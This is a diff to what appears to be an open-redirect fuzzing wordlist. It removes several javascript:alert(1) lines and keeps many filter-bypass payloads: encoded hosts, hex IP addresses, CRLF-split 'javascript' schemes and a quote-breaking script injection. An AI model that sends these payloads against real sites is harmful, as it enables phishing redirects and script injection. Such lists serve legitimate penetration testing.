@@ -92,18 +92,6 @@ https://%5cwww.whitelisteddomain.tld@google.com
 /https://%5cwww.whitelisteddomain.tld@google.com
 https://google.com
 https://www.whitelisteddomain.tld@google.com
-javascript:alert(1);
-javascript:alert(1)
-//javascript:alert(1);
-/javascript:alert(1);
-//javascript:alert(1)
-/javascript:alert(1)
-/%5cjavascript:alert(1);
-/%5cjavascript:alert(1)
-//%5cjavascript:alert(1);
-//%5cjavascript:alert(1)
-/%09/javascript:alert(1);
-/%09/javascript:alert(1)
 java%0d%0ascript%0d%0a:alert(0)
 //google.com
 https:google.com
@@ -113,7 +101,6 @@ https:google.com
 //google%00.com
 https://www.whitelisteddomain.tld/https://www.google.com/
 ";alert(0);//
-javascript://www.whitelisteddomain.tld?%a0alert%281%29
 http://0xd8.0x3a.0xd6.0xce
 http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
 http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
@@ -222,7 +209,6 @@ http:XY>.7d8T\205pZM@00330.0x3a.54990
 /ｰgoogle.com
 %68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
 http://%67%6f%6f%67%6c%65%2e%63%6f%6d
-<>javascript:alert(1);
 <>//google.com
 //google.com\@www.whitelisteddomain.tld
 https://:@google.com\@www.whitelisteddomain.tld
